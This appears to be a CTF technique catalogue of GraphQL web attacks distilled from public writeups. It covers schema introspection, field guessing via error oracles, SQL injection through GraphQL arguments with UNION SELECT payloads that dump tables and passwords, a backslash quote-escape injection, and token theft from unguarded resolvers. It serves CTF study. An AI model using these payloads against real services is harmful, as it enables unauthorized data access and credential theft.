# web-graphql — techniques reported in public CTF writeups

**This is published knowledge, not local experience.** Nothing here was solved
in this repository. `evidence_level` for this class stays `catalogue` and
this class's field notes stay a template stub on purpose: that stub is the
honest backlog of classes nothing here has solved.
Every claim below carries the writeup URL it came from and a verbatim span
from the fetched page. A writeup's own claim is not verification.

Source: 18,493-URL public writeup catalog, fetched and distilled
2026-09-26; each card was checked by a second pass that rejected 48 of 150.


## 1. POST the standard __schema introspection query to the GraphQL endpoint and read the full type/field list, which names root resolvers the front-end never calls.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: Introspection is on by default in most GraphQL server libraries and is answered before any application authorization runs, so the schema - including flag-dispensing, admin or debug root fields - is readable by anyone who can reach the endpoint.
- **first probe**: One request: POST the endpoint with Content-Type: application/json and body {"query":"{__schema{types{name,fields{name}}}}"}; on servers that accept GET, the same document works as ?query={__schema{types{name}}}.
- **expected signal**: HTTP 200 with a data.__schema.types array listing Query/Mutation fields absent from the front-end JavaScript - names such as super_super_secret_flag_dispenser, flag, backdoor, allUsers or filterprofile; calling the named field directly is then the whole exploit.
- **falsifier**: The endpoint answers the introspection document with an error or a null/empty __schema (introspection disabled, or the request is rejected without a token) - then the schema has to be recovered field name by field name from validation errors instead.
- **sources** (6):
  - CTFZone 2023 Quals — https://cr3.mov/posts/ctfzone23-web-raw-love
    > curl -X POST -d '{ "query": "{__schema{types{name,fields{name}}}}" }' \ -H "Content-Type: application/json"
  - Hack.lu CTF 2020 — https://github.com/klassiker/ctf-writeups/blob/master/2020/hacklu/confessions.md
    > Using `{ __schema { types { name fields { name description } } } }` with `gql` in the developer console reveals some interesting information
  - darkCON CTF — https://github.com/m3ssap0/CTF-Writeups/blob/master/DarkCON%20CTF%202021/DarkCON%20Challs/README.md
    > query={__schema{types{name}}} HTTP/1.1 200 OK
  - VolgaCTF 2020 Qualifier — https://spotless.tech/volgactf-2020-qualifier-Library.html
    > http://library.q.2020.volgactf.ru:7781/api/?query={__schema{types{name}}} type Book { title : String ! author : St
  - MetaCTF CyberGames 2021 — https://github.com/team23ctf/writeups/blob/main/metactf2021/Looking%20Inwards/Looking%20Inwards.md
    > query { super_super_secret_flag_dispenser(authorized: true) } ``` Ou
  - Winja CTF | c0c0n 2021 — https://github.com/MustafaRaad7/Winja-CTF-Writeups/blob/main/BlogQL/README.md
    > query { __schema { queryType { fields { name type

## 2. When introspection is unavailable, guess root field names one per request and use the validation-error difference (status plus body length) as an existence oracle.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: GraphQL validates the whole document against the schema before a resolver runs, so an unknown field, a known field with the wrong selection set, and a correct selection each produce a different response - the server leaks schema membership through its own error shape.
- **first probe**: Send {"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { flag }"} and then the same document with a guessed variant such as { secret } and { _secret }, comparing HTTP status and Content-Length.
- **expected signal**: The guesses do not all fail the same way: a non-existent field returns 400 with one body length, an existing field queried wrongly returns 400 with a longer body (the message names the right field or the missing subfields), and the corrected document - here { _secret { flag } } - returns HTTP 200 with data.
- **falsifier**: Every guessed name returns byte-identical status and length, i.e. the server collapses validation failures into one generic error, so name probing yields no signal and the field list must come from another leak.
- **sources** (5):
  - Intent CTF 2021 — https://github.com/evyatar9/Writeups/tree/master/CTFs/2021-Intent-CTF/Web/GraphiCS
    > {"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { flag }\n"} ``` We get: ```http HTTP/2 400 Bad Request
  - Intent CTF 2021 — https://github.com/evyatar9/Writeups/tree/master/CTFs/2021-Intent-CTF/Web/GraphiCS
    > {"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { secret }\n"} ``` Response: ```http HTTP/2 400 Bad Request
  - Intent CTF 2021 — https://github.com/evyatar9/Writeups/tree/master/CTFs/2021-Intent-CTF/Web/GraphiCS
    > {"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { _secret }\n"} ``` Response: ```http HTTP/2 400 Bad Request
  - Intent CTF 2021 — https://github.com/evyatar9/Writeups/tree/master/CTFs/2021-Intent-CTF/Web/GraphiCS
    > {"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { _secret { flag } }\n"} ``` Response: ```http HTTP/2 200 OK
  - Intent CTF 2021 — https://github.com/evyatar9/Writeups/tree/master/CTFs/2021-Intent-CTF/Web/GraphiCS
    > Content-Length: 1243 Access-Control-Allow-Origin: * Etag: W/"4db-xXUSR2t6rs3rXiz/5CIbD+3nF6g" Strict-Transport-Security:

## 3. Treat every GraphQL argument as an ordinary injection point: a resolver that concatenates the argument into a database query answers a lone quote with a driver error, and then a UNION SELECT reads arbitrary tables through the same field.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: The GraphQL type system only guarantees the argument is a String; it says nothing about what the resolver does next, and these resolvers build SQL by string concatenation, so the argument value reaches the database parser unchanged.
- **first probe**: Repeat a working query with one quote appended to the argument, e.g. query {getNote(q: "test'" ){body}} or query { backdoor( id: "'", hash:"..." ) }, and read the errors array.
- **expected signal**: The errors array carries the raw driver text - "(sqlite3.OperationalError) unr..." - proving the string reached SQL; a UNION SELECT against sqlite_master or INFORMATION_SCHEMA then returns table and column names inside the normal data field of that same resolver.
- **falsifier**: The quote is returned as ordinary data or rejected with a generic application message, the column-count UNION probe changes nothing, and no driver text ever appears - the argument is bound as a parameter.
- **sources** (6):
  - 0x41414141 CTF — https://luftenshjaltar.info/writeups/0x41414141ctf/web/graphed2.0
    > query {getNote(q: "test'" ){body}} Response: { "errors" :[{ "message" : "(sqlite3.OperationalError) unr
  - 0x41414141 CTF — https://luftenshjaltar.info/writeups/0x41414141ctf/web/graphed2.0
    > query {getNote(q: "' UNION SELECT tbl_name, null, null, null FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
  - BatPwn - BSides Ahmedabad CTF 2020 — https://ctftime.org/writeup/21125
    > query { backdoor( id: "'", hash:"3590cb8af0bbb9e78c343b52b93773c9" ) } ``` And we some interesting result
  - BatPwn - BSides Ahmedabad CTF 2020 — https://ctftime.org/writeup/21125
    > query { backdoor( id: "' UNION SELECT 'injection!' --", hash:"bd79bdabd1a61dd2ea75f2fb04af9ed4" ) } ``` will give us result
  - H@cktivityCon 2021 CTF — https://ctftime.org/writeup/30298
    > query UserQuery{ post (name:"' union select 1,2,3,password,5,6 from users --") { content } }
  - BatPwn - BSides Ahmedabad CTF 2020 — https://ctftime.org/writeup/21125
    > ' union select sql FROM sqlite_master LIMIT 2,1; --` returns `CREATE TABLE flag_random_name (\n\tid INTEGER NOT NULL, \n\tflag VARCHAR,

## 4. Against a filter input object whose fields are concatenated into one WHERE clause, end the sanitised field with a backslash so its closing quote is escaped and the next field of the same object is parsed as SQL.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: The sanitiser runs per field (here replace() strips single quotes from login) but the fields are joined into a single statement, so a trailing backslash consumes the closing quote and the string literal ends only inside a sibling field that nobody thought to filter.
- **first probe**: Two queries: first the filter with a plain quote, filter: { login: "'" }, to confirm the quote is stripped rather than errored; then filter: { login: "\\" email: " OR 1=1 -- " } and compare the returned rows.
- **expected signal**: The quote-only filter returns a harmless empty login while the backslash filter changes the result set or raises a database error, matching the reconstructed statement SELECT * FROM users WHERE login='\' OR email=' OR 1=1 -- '; the sibling field then carries a full UNION SELECT and its output appears in the returned records.
- **falsifier**: The backslash filter behaves exactly like the literal filter (same rows, no error), or an empty filter object already errors - each field is bound separately, so no field can terminate another's literal.
- **sources** (5):
  - VolgaCTF 2020 Qualifier — https://spotless.tech/volgactf-2020-qualifier-Library.html
    > Query: query { testGetUsersByFilter ( filter: { login: "'" } ) {
  - VolgaCTF 2020 Qualifier — https://spotless.tech/volgactf-2020-qualifier-Library.html
    > SQL injection by escaping closing ' Query: query { testGetUsersByFilter ( filter: { login: "\\" email:
  - VolgaCTF 2020 Qualifier — https://spotless.tech/volgactf-2020-qualifier-Library.html
    > SELECT * FROM users WHERE login='\' OR email='' query { testGetUsersByFilter ( filter: { login: "\\" email:
  - VolgaCTF 2020 Qualifier — https://spotless.tech/volgactf-2020-qualifier-Library.html
    > testGetUsersByFilter ( filter: { login: "\\" email: " UNION SELECT 1,TABLE_NAME,3,4,5,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS -- " } ) { login email } } Get flag query { t
  - VolgaCTF 2020 Qualifier — https://spotless.tech/volgactf-2020-qualifier-Library.html
    > we can dump the user table: Query: query { testGetUsersByFilter ( filter: {} ) { login } } H

## 5. Pair the guarded flag resolver with an unguarded listing resolver in the same schema: the field that demands a token is unlocked by the field that hands the tokens out.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: Authorization in these schemas is implemented per resolver, not at the endpoint, so a users/allUsers resolver that was simply never given a check returns the token, password or role that the flag resolver validates.
- **first probe**: Call the guarded field bare to learn what it demands - query { flag } - then list the user type in a second request: query{ users{ token, username } }.
- **expected signal**: flag answers with an authorization message such as "error authenticating user: invalid token" while the user listing returns HTTP 200 carrying token/password values; replaying one of those into flag(token: "...") (or into the session cookie the same app reads) returns the flag.
- **falsifier**: The listing resolver is itself authorized, or the returned user objects have no token/password/role field at all - nothing crosses from one resolver to the other and the gate has to be attacked directly.
- **sources** (6):
  - corCTF 2021 — https://github.com/sahruldotid/CTF-Writeups/blob/main/corCTF_2021/web/devme/README.md
    > query{ users{ token, username } } ``` **Response** ``` { "da
  - corCTF 2021 — https://github.com/sahruldotid/CTF-Writeups/blob/main/corCTF_2021/web/devme/README.md
    > query{ flag(token: "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3d
  - H@cktivityCon 2021 CTF — https://ctftime.org/writeup/30298
    > query { flag } ``` But we get in response: ``` "message":"error authenticating user: invalid token"
  - darkCON CTF — https://github.com/m3ssap0/CTF-Writeups/blob/master/DarkCON%20CTF%202021/DarkCON%20Challs/README.md
    > query=query Query { allUsers { id username password } } HTTP/1.1 200 OK Date: Sun, 21 Feb 2021 09:08:31 GMT Content-Type: ap
  - H@cktivityCon 2021 CTF — https://ctftime.org/writeup/30298
    > and set ``` query { flag } ``` and we have flag in response
  - corCTF 2021 — https://larry.science/post/corctf-2021/#saasme-2-solves
    > type Query { users: [ User ]! flag(token: String !): String ! }
